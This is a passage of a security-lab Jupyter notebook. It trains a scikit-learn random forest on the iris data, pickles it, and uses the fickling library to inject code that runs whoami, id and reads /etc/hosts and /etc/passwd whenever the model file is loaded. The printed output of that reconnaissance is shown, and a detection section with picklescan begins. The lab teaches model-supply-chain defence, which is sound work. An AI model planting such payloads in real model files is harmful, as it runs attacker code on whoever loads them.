       "  color: var(--sklearn-color-background);\n",
       "  text-decoration: none;\n",
       "}\n",
       "\n",
       "div.sk-estimator.fitted:hover .sk-estimator-doc-link.fitted:hover,\n",
       ".sk-estimator-doc-link.fitted:hover,\n",
       "div.sk-label-container:hover .sk-estimator-doc-link.fitted:hover,\n",
       ".sk-estimator-doc-link.fitted:hover {\n",
       "  /* fitted */\n",
       "  background-color: var(--sklearn-color-fitted-level-3);\n",
       "  color: var(--sklearn-color-background);\n",
       "  text-decoration: none;\n",
       "}\n",
       "\n",
       "/* Span, style for the box shown on hovering the info icon */\n",
       ".sk-estimator-doc-link span {\n",
       "  display: none;\n",
       "  z-index: 9999;\n",
       "  position: relative;\n",
       "  font-weight: normal;\n",
       "  right: .2ex;\n",
       "  padding: .5ex;\n",
       "  margin: .5ex;\n",
       "  width: min-content;\n",
       "  min-width: 20ex;\n",
       "  max-width: 50ex;\n",
       "  color: var(--sklearn-color-text);\n",
       "  box-shadow: 2pt 2pt 4pt #999;\n",
       "  /* unfitted */\n",
       "  background: var(--sklearn-color-unfitted-level-0);\n",
       "  border: .5pt solid var(--sklearn-color-unfitted-level-3);\n",
       "}\n",
       "\n",
       ".sk-estimator-doc-link.fitted span {\n",
       "  /* fitted */\n",
       "  background: var(--sklearn-color-fitted-level-0);\n",
       "  border: var(--sklearn-color-fitted-level-3);\n",
       "}\n",
       "\n",
       ".sk-estimator-doc-link:hover span {\n",
       "  display: block;\n",
       "}\n",
       "\n",
       "/* \"?\"-specific style due to the `<a>` HTML tag */\n",
       "\n",
       "#sk-container-id-1 a.estimator_doc_link {\n",
       "  float: right;\n",
       "  font-size: 1rem;\n",
       "  line-height: 1em;\n",
       "  font-family: monospace;\n",
       "  background-color: var(--sklearn-color-background);\n",
       "  border-radius: 1rem;\n",
       "  height: 1rem;\n",
       "  width: 1rem;\n",
       "  text-decoration: none;\n",
       "  /* unfitted */\n",
       "  color: var(--sklearn-color-unfitted-level-1);\n",
       "  border: var(--sklearn-color-unfitted-level-1) 1pt solid;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 a.estimator_doc_link.fitted {\n",
       "  /* fitted */\n",
       "  border: var(--sklearn-color-fitted-level-1) 1pt solid;\n",
       "  color: var(--sklearn-color-fitted-level-1);\n",
       "}\n",
       "\n",
       "/* On hover */\n",
       "#sk-container-id-1 a.estimator_doc_link:hover {\n",
       "  /* unfitted */\n",
       "  background-color: var(--sklearn-color-unfitted-level-3);\n",
       "  color: var(--sklearn-color-background);\n",
       "  text-decoration: none;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 a.estimator_doc_link.fitted:hover {\n",
       "  /* fitted */\n",
       "  background-color: var(--sklearn-color-fitted-level-3);\n",
       "}\n",
       "\n",
       ".estimator-table summary {\n",
       "    padding: .5rem;\n",
       "    font-family: monospace;\n",
       "    cursor: pointer;\n",
       "}\n",
       "\n",
       ".estimator-table details[open] {\n",
       "    padding-left: 0.1rem;\n",
       "    padding-right: 0.1rem;\n",
       "    padding-bottom: 0.3rem;\n",
       "}\n",
       "\n",
       ".estimator-table .parameters-table {\n",
       "    margin-left: auto !important;\n",
       "    margin-right: auto !important;\n",
       "}\n",
       "\n",
       ".estimator-table .parameters-table tr:nth-child(odd) {\n",
       "    background-color: #fff;\n",
       "}\n",
       "\n",
       ".estimator-table .parameters-table tr:nth-child(even) {\n",
       "    background-color: #f6f6f6;\n",
       "}\n",
       "\n",
       ".estimator-table .parameters-table tr:hover {\n",
       "    background-color: #e0e0e0;\n",
       "}\n",
       "\n",
       ".estimator-table table td {\n",
       "    border: 1px solid rgba(106, 105, 104, 0.232);\n",
       "}\n",
       "\n",
       ".user-set td {\n",
       "    color:rgb(255, 94, 0);\n",
       "    text-align: left;\n",
       "}\n",
       "\n",
       ".user-set td.value pre {\n",
       "    color:rgb(255, 94, 0) !important;\n",
       "    background-color: transparent !important;\n",
       "}\n",
       "\n",
       ".default td {\n",
       "    color: black;\n",
       "    text-align: left;\n",
       "}\n",
       "\n",
       ".user-set td i,\n",
       ".default td i {\n",
       "    color: black;\n",
       "}\n",
       "\n",
       ".copy-paste-icon {\n",
       "    background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0NDggNTEyIj48IS0tIUZvbnQgQXdlc29tZSBGcmVlIDYuNy4yIGJ5IEBmb250YXdlc29tZSAtIGh0dHBzOi8vZm9udGF3ZXNvbWUuY29tIExpY2Vuc2UgLSBodHRwczovL2ZvbnRhd2Vzb21lLmNvbS9saWNlbnNlL2ZyZWUgQ29weXJpZ2h0IDIwMjUgRm9udGljb25zLCBJbmMuLS0+PHBhdGggZD0iTTIwOCAwTDMzMi4xIDBjMTIuNyAwIDI0LjkgNS4xIDMzLjkgMTQuMWw2Ny45IDY3LjljOSA5IDE0LjEgMjEuMiAxNC4xIDMzLjlMNDQ4IDMzNmMwIDI2LjUtMjEuNSA0OC00OCA0OGwtMTkyIDBjLTI2LjUgMC00OC0yMS41LTQ4LTQ4bDAtMjg4YzAtMjYuNSAyMS41LTQ4IDQ4LTQ4ek00OCAxMjhsODAgMCAwIDY0LTY0IDAgMCAyNTYgMTkyIDAgMC0zMiA2NCAwIDAgNDhjMCAyNi41LTIxLjUgNDgtNDggNDhMNDggNTEyYy0yNi41IDAtNDgtMjEuNS00OC00OEwwIDE3NmMwLTI2LjUgMjEuNS00OCA0OC00OHoiLz48L3N2Zz4=);\n",
       "    background-repeat: no-repeat;\n",
       "    background-size: 14px 14px;\n",
       "    background-position: 0;\n",
       "    display: inline-block;\n",
       "    width: 14px;\n",
       "    height: 14px;\n",
       "    cursor: pointer;\n",
       "}\n",
       "</style><body><div id=\"sk-container-id-1\" class=\"sk-top-container\"><div class=\"sk-text-repr-fallback\"><pre>RandomForestClassifier(random_state=10)</pre><b>In a Jupyter environment, please rerun this cell to show the HTML representation or trust the notebook. <br />On GitHub, the HTML representation is unable to render, please try loading this page with nbviewer.org.</b></div><div class=\"sk-container\" hidden><div class=\"sk-item\"><div class=\"sk-estimator fitted sk-toggleable\"><input class=\"sk-toggleable__control sk-hidden--visually\" id=\"sk-estimator-id-1\" type=\"checkbox\" checked><label for=\"sk-estimator-id-1\" class=\"sk-toggleable__label fitted sk-toggleable__label-arrow\"><div><div>RandomForestClassifier</div></div><div><a class=\"sk-estimator-doc-link fitted\" rel=\"noreferrer\" target=\"_blank\" href=\"https://scikit-learn.org/1.7/modules/generated/sklearn.ensemble.RandomForestClassifier.html\">?<span>Documentation for RandomForestClassifier</span></a><span class=\"sk-estimator-doc-link fitted\">i<span>Fitted</span></span></div></label><div class=\"sk-toggleable__content fitted\" data-param-prefix=\"\">\n",
       "        <div class=\"estimator-table\">\n",
       "            <details>\n",
       "                <summary>Parameters</summary>\n",
       "                <table class=\"parameters-table\">\n",
       "                  <tbody>\n",
       "                    \n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('n_estimators',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">n_estimators&nbsp;</td>\n",
       "            <td class=\"value\">100</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('criterion',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">criterion&nbsp;</td>\n",
       "            <td class=\"value\">&#x27;gini&#x27;</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('max_depth',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">max_depth&nbsp;</td>\n",
       "            <td class=\"value\">None</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('min_samples_split',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">min_samples_split&nbsp;</td>\n",
       "            <td class=\"value\">2</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('min_samples_leaf',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">min_samples_leaf&nbsp;</td>\n",
       "            <td class=\"value\">1</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('min_weight_fraction_leaf',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">min_weight_fraction_leaf&nbsp;</td>\n",
       "            <td class=\"value\">0.0</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('max_features',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">max_features&nbsp;</td>\n",
       "            <td class=\"value\">&#x27;sqrt&#x27;</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('max_leaf_nodes',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">max_leaf_nodes&nbsp;</td>\n",
       "            <td class=\"value\">None</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('min_impurity_decrease',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">min_impurity_decrease&nbsp;</td>\n",
       "            <td class=\"value\">0.0</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('bootstrap',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">bootstrap&nbsp;</td>\n",
       "            <td class=\"value\">True</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('oob_score',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">oob_score&nbsp;</td>\n",
       "            <td class=\"value\">False</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('n_jobs',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">n_jobs&nbsp;</td>\n",
       "            <td class=\"value\">None</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"user-set\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('random_state',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">random_state&nbsp;</td>\n",
       "            <td class=\"value\">10</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('verbose',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">verbose&nbsp;</td>\n",
       "            <td class=\"value\">0</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('warm_start',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">warm_start&nbsp;</td>\n",
       "            <td class=\"value\">False</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('class_weight',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">class_weight&nbsp;</td>\n",
       "            <td class=\"value\">None</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('ccp_alpha',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">ccp_alpha&nbsp;</td>\n",
       "            <td class=\"value\">0.0</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('max_samples',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">max_samples&nbsp;</td>\n",
       "            <td class=\"value\">None</td>\n",
       "        </tr>\n",
       "    \n",
       "\n",
       "        <tr class=\"default\">\n",
       "            <td><i class=\"copy-paste-icon\"\n",
       "                 onclick=\"copyToClipboard('monotonic_cst',\n",
       "                          this.parentElement.nextElementSibling)\"\n",
       "            ></i></td>\n",
       "            <td class=\"param\">monotonic_cst&nbsp;</td>\n",
       "            <td class=\"value\">None</td>\n",
       "        </tr>\n",
       "    \n",
       "                  </tbody>\n",
       "                </table>\n",
       "            </details>\n",
       "        </div>\n",
       "    </div></div></div></div></div><script>function copyToClipboard(text, element) {\n",
       "    // Get the parameter prefix from the closest toggleable content\n",
       "    const toggleableContent = element.closest('.sk-toggleable__content');\n",
       "    const paramPrefix = toggleableContent ? toggleableContent.dataset.paramPrefix : '';\n",
       "    const fullParamName = paramPrefix ? `${paramPrefix}${text}` : text;\n",
       "\n",
       "    const originalStyle = element.style;\n",
       "    const computedStyle = window.getComputedStyle(element);\n",
       "    const originalWidth = computedStyle.width;\n",
       "    const originalHTML = element.innerHTML.replace('Copied!', '');\n",
       "\n",
       "    navigator.clipboard.writeText(fullParamName)\n",
       "        .then(() => {\n",
       "            element.style.width = originalWidth;\n",
       "            element.style.color = 'green';\n",
       "            element.innerHTML = \"Copied!\";\n",
       "\n",
       "            setTimeout(() => {\n",
       "                element.innerHTML = originalHTML;\n",
       "                element.style = originalStyle;\n",
       "            }, 2000);\n",
       "        })\n",
       "        .catch(err => {\n",
       "            console.error('Failed to copy:', err);\n",
       "            element.style.color = 'red';\n",
       "            element.innerHTML = \"Failed!\";\n",
       "            setTimeout(() => {\n",
       "                element.innerHTML = originalHTML;\n",
       "                element.style = originalStyle;\n",
       "            }, 2000);\n",
       "        });\n",
       "    return false;\n",
       "}\n",
       "\n",
       "document.querySelectorAll('.fa-regular.fa-copy').forEach(function(element) {\n",
       "    const toggleableContent = element.closest('.sk-toggleable__content');\n",
       "    const paramPrefix = toggleableContent ? toggleableContent.dataset.paramPrefix : '';\n",
       "    const paramName = element.parentElement.nextElementSibling.textContent.trim();\n",
       "    const fullParamName = paramPrefix ? `${paramPrefix}${paramName}` : paramName;\n",
       "\n",
       "    element.setAttribute('title', fullParamName);\n",
       "});\n",
       "</script></body>"
      ],
      "text/plain": [
       "RandomForestClassifier(random_state=10)"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Instantiate the class with 100 decision trees\n",
    "r_forest = RandomForestClassifier(n_estimators=100, criterion='gini', random_state=10)\n",
    "\n",
    "# Fit the model\n",
    "r_forest.fit(X=X, y=y)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "542bd619",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([1.])"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# With the fitted model, let's make a prediction on of the samples\n",
    "# No need to worry about using a different sample here for testing\n",
    "# The objective is not to validate the model's performance\n",
    "# but instead to compromise the model\n",
    "r_forest.predict(X[:1])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "25284728",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([[0.  , 0.98, 0.02]])"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Let us look at the probabilities of this\n",
    "r_forest.predict_proba(X[:1])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "402a22b8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "np.int64(1)"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Let's grab the index position with the highest value\n",
    "# Above, we see the highest value in in index position 1 -> 0.99\n",
    "# Let us look at the probabilities of this\n",
    "np.argmax(r_forest.predict_proba(X[:1]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "e9d439f9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'versicolor'"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# What is 1 associated with? \n",
    "# let us plug the information above back into the labels\n",
    "# This tells us that our sample is a versicolor\n",
    "iris_classes[np.argmax(r_forest.predict_proba(X[:1]))].item()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c7f52759",
   "metadata": {},
   "source": [
    "So we have a model that works and we know how that it could be deployed if needed. Let us make this a bit more real.   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "3d18774f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/tmp/r_forest_legit.pkl\n",
      "b9f991b9fa200add9db68f17233e6e21  /tmp/r_forest_legit.pkl\n"
     ]
    }
   ],
   "source": [
    "# Setup the file path for the legit file\n",
    "r_forest_path = '/tmp/r_forest_legit.pkl'\n",
    "\n",
    "# Now that we know we can use the model as expected, lets save the model\n",
    "with open(file=r_forest_path, mode='wb') as rf_forest_legit:\n",
    "    pickle.dump(obj=r_forest, file=rf_forest_legit)\n",
    "\n",
    "# Verify the file has been created\n",
    "!ls  {r_forest_path}\n",
    "\n",
    "# Validate the integrity of the file by getting its hash\n",
    "!md5sum {r_forest_path}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "47367c19",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<fickling.fickle.Pickled at 0x7f4d9bf7e120>"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Let us exploit this legit model\n",
    "# Assuming we stole the model after compromising the environment\n",
    "# Or through some other means\n",
    "with open(file=r_forest_path, mode='rb') as legit_file:\n",
    "    stolen_model = Pickled.load(pickled=legit_file)\n",
    "\n",
    "stolen_model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "d6c91a77",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Performing reconnaissance ...\n",
      "securitynik\n",
      "uid=1000(securitynik) gid=1000(securitynik) groups=1000(securitynik),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users)\n",
      "# This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:\n",
      "# [network]\n",
      "# generateHosts = false\n",
      "127.0.0.1\tlocalhost\n",
      "127.0.1.1\tSECURITYNIK-G14.\tSECURITYNIK-G14\n",
      "\n",
      "# The following lines are desirable for IPv6 capable hosts\n",
      "::1     ip6-localhost ip6-loopback\n",
      "fe00::0 ip6-localnet\n",
      "ff00::0 ip6-mcastprefix\n",
      "ff02::1 ip6-allnodes\n",
      "ff02::2 ip6-allrouters\n",
      "root:x:0:0:root:/root:/bin/bash\n",
      "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
      "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n",
      "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n",
      "sync:x:4:65534:sync:/bin:/bin/sync\n",
      "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n",
      "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n",
      "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n",
      "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n",
      "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n",
      "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n",
      "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n",
      "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
      "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n",
      "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n",
      "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n",
      "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n",
      "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n",
      "systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n",
      "systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin\n",
      "dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\n",
      "messagebus:x:101:101::/nonexistent:/usr/sbin/nologin\n",
      "syslog:x:102:102::/nonexistent:/usr/sbin/nologin\n",
      "systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin\n",
      "uuidd:x:103:103::/run/uuidd:/usr/sbin/nologin\n",
      "landscape:x:104:105::/var/lib/landscape:/usr/sbin/nologin\n",
      "polkitd:x:990:990:User for polkitd:/:/usr/sbin/nologin\n",
      "securitynik:x:1000:1000:,,,:/home/securitynik:/bin/bash\n",
      "mongodb:x:105:65534::/nonexistent:/usr/sbin/nologin\n",
      "tcpdump:x:106:110::/nonexistent:/usr/sbin/nologin\n",
      "Reconnaissance completed!\n"
     ]
    }
   ],
   "source": [
    "'''\n",
    "Setup our malicious code\n",
    "We are leveraging the os.system() module here.\n",
    "We can use any function that allows us to interact with the OS and we will use other techniques later\n",
    "This is not inserted in the model as yet and is only used for us to understand the input that will be injected\n",
    "This code just performs some basic reconnaissance on the host loading the model\n",
    "'''\n",
    "\n",
    "MALICIOUS_CODE = \"\"\"\n",
    "print('Performing reconnaissance ...')\n",
    "import os\n",
    "os.system('whoami')\n",
    "os.system('id')\n",
    "\n",
    "# could even chain these commands also via os.system()\n",
    "os.system('cat /etc/hosts;cat /etc/passwd')\n",
    "\n",
    "print('Reconnaissance completed!')\n",
    "\"\"\"\n",
    "\n",
    "# Run this if you wish to see the code before injecting\n",
    "# Here we are using exec to call the code above\n",
    "exec(MALICIOUS_CODE)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "8a792c1b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "7"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "'''\n",
    "Let us insert our malicious code into the actual model\n",
    "Finish up this\n",
    "While you would like to use the MALICIOUS_CODE variable above\n",
    "It will not work in this circumstance\n",
    "let's copy and paste the raw code\n",
    "The variable would work in the notebook but not outside of it\n",
    "We want to ensure our code is reliable both insdide \n",
    "'''\n",
    "\n",
    "# This is the same code as in MALICIOUS_CODE above\n",
    "# Maybe we should encode this in one way or another. \n",
    "# Maybe we will do this later :-D \n",
    "stolen_model.insert_python_exec(\"\"\"exec(\"print('Performing reconnaissance ...');import os;os.system('whoami');os.system('id');os.system('cat /etc/hosts;cat /etc/passwd');print('Reconnaissance completed!')\")\"\"\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "ae12d7de",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Assuming that we did everything correctly\n",
    "# Let us save the compromised model\n",
    "# First save a file for the recon information\n",
    "with open(file=r'/tmp/recon.txt', mode='wb') as recon_file:\n",
    "    with open(file=r_forest_path, mode='wb') as legit_file:\n",
    "\n",
    "        # Write the file back to disk\n",
    "        stolen_model.dump(legit_file)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "76246c0a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Performing reconnaissance ...\n",
      "securitynik\n",
      "uid=1000(securitynik) gid=1000(securitynik) groups=1000(securitynik),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users)\n",
      "# This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:\n",
      "# [network]\n",
      "# generateHosts = false\n",
      "127.0.0.1\tlocalhost\n",
      "127.0.1.1\tSECURITYNIK-G14.\tSECURITYNIK-G14\n",
      "\n",
      "# The following lines are desirable for IPv6 capable hosts\n",
      "::1     ip6-localhost ip6-loopback\n",
      "fe00::0 ip6-localnet\n",
      "ff00::0 ip6-mcastprefix\n",
      "ff02::1 ip6-allnodes\n",
      "ff02::2 ip6-allrouters\n",
      "root:x:0:0:root:/root:/bin/bash\n",
      "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
      "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n",
      "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n",
      "sync:x:4:65534:sync:/bin:/bin/sync\n",
      "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n",
      "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n",
      "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n",
      "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n",
      "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n",
      "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n",
      "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n",
      "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
      "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n",
      "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n",
      "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n",
      "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n",
      "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n",
      "systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n",
      "systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin\n",
      "dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\n",
      "messagebus:x:101:101::/nonexistent:/usr/sbin/nologin\n",
      "syslog:x:102:102::/nonexistent:/usr/sbin/nologin\n",
      "systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin\n",
      "uuidd:x:103:103::/run/uuidd:/usr/sbin/nologin\n",
      "landscape:x:104:105::/var/lib/landscape:/usr/sbin/nologin\n",
      "polkitd:x:990:990:User for polkitd:/:/usr/sbin/nologin\n",
      "securitynik:x:1000:1000:,,,:/home/securitynik:/bin/bash\n",
      "mongodb:x:105:65534::/nonexistent:/usr/sbin/nologin\n",
      "tcpdump:x:106:110::/nonexistent:/usr/sbin/nologin\n",
      "Reconnaissance completed!\n"
     ]
    }
   ],
   "source": [
    "# Now assuming that we did everything correctly above, \n",
    "# when the user loads the model\n",
    "# The note on performing reconnaissance is just for us. \n",
    "# We would not share it with the users\n",
    "with open(file=r_forest_path, mode='rb') as legit_file:\n",
    "\n",
    "        # Load the trusted_model\n",
    "        trusted_model = pickle.load(file=legit_file)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "29eb68c3",
   "metadata": {},
   "source": [
    "### Validate this with load_model.py\n",
    "You can also validate that this works outside of the notebook by running the load_model.py script.    \n",
    "\n",
    "Look at the contents in the recon file:   \n",
    "$ cat /tmp/recon.txt\n",
    "\n",
    "The script usage is python:\n",
    "$ python load_model.py --model /tmp/r_forest_legit.pkl     \n",
    "\n",
    "You should see similar results as above on your console   \n",
    "\n",
    "### Step 5:  \n",
    "Detecting this activity   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "4f288284",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import Picklescan library\n",
    "# https://github.com/mmaitre314/picklescan\n",
    "import picklescan.scanner as pk_scanner"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "2bcb11bb",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([1.])"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Can the compromised model make predictions?\n",
    "# Let us find out\n",
    "trusted_model.predict(X[:1])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6054b25b",
   "metadata": {},
   "source": [
    "So what we should have done was was to validate the model before loading it up and making any predictions. Let us do that.  \n",
    "\n",
    "We arleady saw in lab: **hash_enc_logging.ipynb** how we can leverage encryption, hashing and logging to ensure we are able to detect possible compromises sooner. \n",
    "\n",
